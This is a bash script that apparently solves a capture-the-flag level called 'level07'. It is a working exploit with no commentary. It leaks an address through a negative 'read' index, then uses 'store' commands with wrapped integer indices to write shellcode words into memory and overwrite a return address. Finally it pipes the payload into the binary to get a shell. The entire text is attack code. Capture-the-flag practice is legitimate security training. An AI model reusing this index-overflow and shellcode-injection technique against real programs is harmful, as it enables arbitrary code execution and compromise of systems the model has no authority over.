#!/usr/bin/env bash

echo "read
-9
quit" > /tmp/adr
adr=$(cat /tmp/adr | ./level07)
index=$(echo ${adr} | cut -d '[' -f 2 | cut -d ' ' -f 3)
echo "store
1750122545
2147483648
store
1752379183
1
store
1768042344
2
store
836995438
2147483651
store
1791658441
4
store
2160941067
5
store
${index}
2147483762
quit" > /tmp/exploit_level07

cat /tmp/exploit_level07 - | ./level07
